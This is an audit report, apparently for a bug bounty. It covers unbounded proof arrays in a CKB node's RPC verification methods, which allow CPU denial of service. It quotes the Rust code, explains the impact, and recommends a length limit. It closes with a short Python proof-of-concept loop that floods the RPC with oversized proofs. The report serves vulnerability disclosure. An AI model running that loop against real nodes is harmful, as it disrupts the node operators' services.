Audit Report

## Title
Unbounded `indices` and `lemmas` Arrays in `verify_transaction_proof` / `verify_transaction_and_witness_proof` Enable CPU DoS — (File: `rpc/src/module/chain.rs`)

## Summary
Both `verify_transaction_proof` and `verify_transaction_and_witness_proof` RPC methods accept caller-supplied `indices` and `lemmas` arrays inside the proof struct with no length validation before performing Merkle computation. An attacker with access to the RPC port can supply arrays up to the 10 MiB body limit (~150,000 lemmas), forcing proportional blake2b hashing work per request at zero cost, sustaining high CPU load and degrading or halting node operation.

## Finding Description

`verify_transaction_proof` constructs a `MerkleProof` directly from caller-supplied arrays without any length check:

```rust
// rpc/src/module/chain.rs lines 1948–1961
let merkle_proof = MerkleProof::new(
    tx_proof.proof.indices.into_iter().map(|index| index.value()).collect(),
    tx_proof.proof.lemmas.into_iter().map(|lemma| lemma.into()).collect(),
);
CBMT::retrieve_leaves(block.tx_hashes(), &merkle_proof)
    .and_then(|tx_hashes| merkle_proof.root(&tx_hashes) ...
```

`verify_transaction_and_witness_proof` does this **twice** — once for `transactions_proof` and once for `witnesses_proof` — doubling the work per request.

The merge function `MergeByte32::merge()` invokes `new_blake2b()` and performs a full blake2b hash per node pair during `merkle_proof.root()`. With ~150,000 lemmas per proof struct and two structs per `verify_transaction_and_witness_proof` call, each request triggers ~300,000+ blake2b operations before returning an error.

The only pre-computation check is that the referenced `block_hash` exists in the chain — trivially satisfiable with any known block hash. No check on `indices.len()` or `lemmas.len()` exists anywhere in the call path.

By contrast, the light-client P2P handler correctly enforces a limit before doing any work:
```rust
// util/light-client-protocol-server/src/components/get_transactions_proof.rs lines 37–39
if self.message.tx_hashes().len() > constant::GET_TRANSACTIONS_PROOF_LIMIT {
    return StatusCode::MalformedProtocolMessage.with_context("too many transactions");
}
```
The constant `GET_TRANSACTIONS_PROOF_LIMIT` is 1000. The RPC handlers have no equivalent guard.

The `rpc_batch_limit` is opt-in, disabled by default, and limits the number of JSON-RPC calls in a batch — not the size of arrays within a single call's parameters.

## Impact Explanation

A caller with access to the RPC port can sustain high CPU load on the CKB node by continuously sending `verify_transaction_and_witness_proof` requests with maximally-sized `indices`/`lemmas` arrays. Since the RPC server shares the node process, this degrades or halts block processing, P2P message handling, and transaction relay. This matches the allowed impact: **High — Vulnerabilities which could easily crash a CKB node** when the RPC port is exposed, or at minimum **Note — Any local RPC API crash** in the default localhost-only configuration.

## Likelihood Explanation

The default configuration binds the RPC to `127.0.0.1:8114`, restricting access to local processes. However, many node operators expose the RPC port for wallets, dApps, and tooling. No authentication, API key, or rate limit is applied to the Chain RPC module. The attack requires only a valid block hash (any known block hash from the public chain suffices), no tokens or keys, and is trivially scriptable and repeatable. The `Chain` module is enabled by default.

## Recommendation

Add an explicit upper-bound check on `indices.len()` and `lemmas.len()` at the start of both `verify_transaction_proof` and `verify_transaction_and_witness_proof`, before any `MerkleProof::new` or `CBMT::retrieve_leaves` call. A reasonable limit mirrors the light-client constant (`GET_TRANSACTIONS_PROOF_LIMIT = 1000`) or is derived from the maximum transactions per block. Similarly, add an upper-bound check on `tx_hashes.len()` in `get_tx_indices`, which currently only checks `is_empty()`.

## Proof of Concept

```python
import requests

block_hash = "0x7978ec7ce5b507cfb52e149e36b1a23f6062ed150503c85bbf825da3599095ed"
large_lemmas = ["0x" + "00" * 32] * 100_000
large_indices = ["0x0"] * 100_000

payload = {
    "jsonrpc": "2.0", "id": 1,
    "method": "verify_transaction_and_witness_proof",
    "params": [{
        "block_hash": block_hash,
        "transactions_proof": {"indices": large_indices, "lemmas": large_lemmas},
        "witnesses_proof":    {"indices": large_indices, "lemmas": large_lemmas}
    }]
}

while True:
    requests.post("http://127.0.0.1:8114", json=payload)
```

Each iteration forces ~200,000+ blake2b hash operations before returning `"Invalid transaction_and_witness proof"`. Sustained in a loop, this saturates a CPU core and degrades node responsiveness to peers and miners. [1](#0-0) [2](#0-1) [3](#0-2) [4](#0-3) [5](#0-4) [6](#0-5) [7](#0-6)
